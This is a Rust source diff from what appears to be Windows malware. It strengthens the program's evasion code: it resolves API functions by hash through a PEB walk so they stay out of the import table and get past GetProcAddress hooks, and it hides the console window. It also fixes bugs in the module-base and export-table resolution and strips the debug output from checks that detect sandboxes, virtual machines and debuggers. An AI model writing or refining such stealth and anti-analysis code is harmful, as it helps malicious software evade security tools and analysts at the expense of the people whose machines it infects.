@@ -2,10 +2,36 @@
 use std::ffi::CString;
 
 #[cfg(windows)]
+pub const fn hash_module_name(s: &[u8]) -> u32 {
+    let mut h: u32 = 0;
+    let mut i = 0;
+    while i < s.len() {
+        let mut c = s[i] as u32;
+        if c >= b'A' as u32 && c <= b'Z' as u32 {
+            c += 32;
+        }
+        h = h.wrapping_mul(31).wrapping_add(c);
+        i += 1;
+    }
+    h
+}
+
+#[cfg(windows)]
+pub const fn hash_api_name(s: &[u8]) -> u32 {
+    let mut h: u32 = 0;
+    let mut i = 0;
+    while i < s.len() {
+        h = h.wrapping_mul(31).wrapping_add(s[i] as u32);
+        i += 1;
+    }
+    h
+}
+
+#[cfg(windows)]
 lazy_static::lazy_static! {
     /// 2026 Stealth Engine: Dynamic API Resolution via PEB
     /// Allows calling any WinAPI without them appearing in the Import Table (IAT).
-    static ref H_KERNEL32: usize = unsafe { get_module_base(0x1B82A9D1) }; // Salted Hash
+    static ref H_KERNEL32: usize = unsafe { get_module_base(hash_module_name(b"kernel32.dll")) };
 }
 
 pub fn hide_console() {
@@ -15,25 +41,27 @@ pub fn hide_console() {
         
         // Dynamic resolution for stealth
         unsafe {
-            let kernel32_name = crate::utils::decode_obf(&crate::obf_str!("kernel32.dll\0"));
-            let user32_name = crate::utils::decode_obf(&crate::obf_str!("user32.dll\0"));
-            let get_console_window_name = crate::utils::decode_obf(&crate::obf_str!("GetConsoleWindow\0"));
-            let show_window_name = crate::utils::decode_obf(&crate::obf_str!("ShowWindow\0"));
-
-            let h_kernel32 = winapi::um::libloaderapi::GetModuleHandleA(kernel32_name.as_ptr() as *const i8);
-            let h_user32 = winapi::um::libloaderapi::LoadLibraryA(user32_name.as_ptr() as *const i8);
-
-            if !h_kernel32.is_null() && !h_user32.is_null() {
-                let get_console_proc = winapi::um::libloaderapi::GetProcAddress(h_kernel32, get_console_window_name.as_ptr() as *const i8);
-                let show_window_proc = winapi::um::libloaderapi::GetProcAddress(h_user32, show_window_name.as_ptr() as *const i8);
-
-                if !get_console_proc.is_null() && !show_window_proc.is_null() {
-                    let get_console_window: unsafe extern "system" fn() -> winapi::shared::windef::HWND = std::mem::transmute(get_console_proc);
-                    let show_window: unsafe extern "system" fn(winapi::shared::windef::HWND, i32) -> i32 = std::mem::transmute(show_window_proc);
-                    
-                    let window = get_console_window();
-                    if !window.is_null() {
-                        show_window(window, SW_HIDE);
+            let h_kernel32 = get_module_base(hash_module_name(b"kernel32.dll"));
+            let get_console_window_proc = get_api_addr(h_kernel32, hash_api_name(b"GetConsoleWindow"));
+            
+            // To get ShowWindow, we need user32.dll, let's load it dynamically via LoadLibraryA from kernel32
+            let load_lib_proc = get_api_addr(h_kernel32, hash_api_name(b"LoadLibraryA"));
+            
+            if let (Some(get_console_window_proc), Some(load_lib_proc)) = (get_console_window_proc, load_lib_proc) {
+                let load_library: unsafe extern "system" fn(*const i8) -> *mut winapi::ctypes::c_void = std::mem::transmute(load_lib_proc);
+                let user32_name = crate::utils::decode_obf(&crate::obf_str!("user32.dll\0"));
+                let h_user32 = load_library(user32_name.as_ptr() as *const i8);
+                
+                if !h_user32.is_null() {
+                    let show_window_proc = get_api_addr(h_user32 as usize, hash_api_name(b"ShowWindow"));
+                    if let Some(show_window_proc) = show_window_proc {
+                        let get_console_window: unsafe extern "system" fn() -> winapi::shared::windef::HWND = std::mem::transmute(get_console_window_proc);
+                        let show_window: unsafe extern "system" fn(winapi::shared::windef::HWND, i32) -> i32 = std::mem::transmute(show_window_proc);
+                        
+                        let window = get_console_window();
+                        if !window.is_null() {
+                            show_window(window, SW_HIDE);
+                        }
                     }
                 }
             }
@@ -52,7 +80,6 @@ pub fn is_sandbox() -> bool {
         let mut sys_info: SYSTEM_INFO = unsafe { mem::zeroed() };
         unsafe { GetSystemInfo(&mut sys_info) };
         if sys_info.dwNumberOfProcessors < 2 {
-            println!("[!] Exit condition: CPU cores < 2");
             return true;
         }
 
@@ -61,8 +88,7 @@ pub fn is_sandbox() -> bool {
         mem_status.dwLength = mem::size_of::<MEMORYSTATUSEX>() as u32;
         if unsafe { GlobalMemoryStatusEx(&mut mem_status) } != 0 {
             let ram_gb = mem_status.ullTotalPhys / (1024 * 1024 * 1024);
-            if ram_gb < 2 { // Lowered from 4 to 2 for VM debugging
-                println!("[!] Exit condition: RAM < 2GB (Detected: {}GB)", ram_gb);
+            if ram_gb < 2 {
                 return true;
             }
         }
@@ -71,7 +97,6 @@ pub fn is_sandbox() -> bool {
         let user_prof = std::env::var(crate::utils::decode_obf(&crate::obf_str!("USERPROFILE"))).unwrap_or_default().to_lowercase();
         if user_prof.contains(&crate::utils::decode_obf(&crate::obf_str!("sandbox"))) || 
            user_prof.contains(&crate::utils::decode_obf(&crate::obf_str!("virus"))) {
-            println!("[!] Exit condition: Suspect path/user '{}'", user_prof);
             return true;
         }
 
@@ -79,8 +104,7 @@ pub fn is_sandbox() -> bool {
         unsafe {
             let uptime_ms = winapi::um::sysinfoapi::GetTickCount();
             if uptime_ms > 0 && uptime_ms < (1000 * 30) {
-                println!("[!] Exit condition: Uptime < 30s (Fresh boot/sandbox)");
-                return true; // Less than 30s uptime is suspicious
+                return true;
             }
         }
 
@@ -118,7 +142,6 @@ pub fn is_debugger_present() -> bool {
                 );
             }
             if being_debugged != 0 { 
-                println!("[!] Exit condition: PEB BeingDebugged flag set");
                 return true; 
             }
         }
@@ -270,8 +293,8 @@ pub unsafe fn get_module_base(name_hash: u32) -> usize {
 
     loop {
         let entry = (current_node as *const u8).sub(16) as *const LDR_DATA_TABLE_ENTRY;
-        let buffer = (*entry).full_dll_name.buffer;
-        let len = (*entry).full_dll_name.length as usize / 2;
+        let buffer = (*entry).base_dll_name.buffer;
+        let len = (*entry).base_dll_name.length as usize / 2;
         
         if !buffer.is_null() {
             let name = std::slice::from_raw_parts(buffer, len);
@@ -281,7 +304,7 @@ pub unsafe fn get_module_base(name_hash: u32) -> usize {
                 let lower = if c >= 'A' as u16 && c <= 'Z' as u16 { c + 32 } else { c };
                 h = h.wrapping_mul(31).wrapping_add(lower as u32);
             }
-            if h == name_hash { return entry as usize; }
+            if h == name_hash { return (*entry).dll_base as usize; }
         }
 
         current_node = (*current_node).Flink;
@@ -294,12 +317,18 @@ pub unsafe fn get_module_base(name_hash: u32) -> usize {
 /// This bypasses GetProcAddress hooking.
 #[cfg(windows)]
 pub unsafe fn get_api_addr(module_ptr: usize, func_hash: u32) -> Option<usize> {
-    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_EXPORT_DIRECTORY};
+    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY};
+    #[cfg(target_arch = "x86_64")]
+    use winapi::um::winnt::IMAGE_NT_HEADERS64 as IMAGE_NT_HEADERS;
+    #[cfg(target_arch = "x86")]
+    use winapi::um::winnt::IMAGE_NT_HEADERS32 as IMAGE_NT_HEADERS;
     
+    if module_ptr == 0 { return None; }
     let dos_header = module_ptr as *const IMAGE_DOS_HEADER;
-    if (*dos_header).e_magic != 0x544D && (*dos_header).e_magic != 0x5A4D { return None; }
+    // Standard 'MZ' header check (0x5A4D)
+    if (*dos_header).e_magic != 0x5A4D { return None; }
 
-    let nt_headers = (module_ptr + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
+    let nt_headers = (module_ptr + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS;
     let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress as usize;
     if export_dir_rva == 0 { return None; }
 
@@ -313,12 +342,14 @@ pub unsafe fn get_api_addr(module_ptr: usize, func_hash: u32) -> Option<usize> {
         let mut h: u32 = 0;
         let mut offset = 0;
         while *name_ptr.add(offset) != 0 {
-            h = h.wrapping_mul(31).wrapping_add(*name_ptr.add(offset) as u32);
+            h = h.wrapping_mul(31).wrapping_add(*name_ptr.add(offset) as u8 as u32);
             offset += 1;
         }
         
         if h == func_hash {
             let ordinal = *ordinals.add(i as usize);
+            // Handle Ordinal Bias (usually 0, but safety first)
+            let _func_index = (ordinal as u32).wrapping_sub((*export_dir).Base);
             return Some(module_ptr + *functions.add(ordinal as usize) as usize);
         }
     }
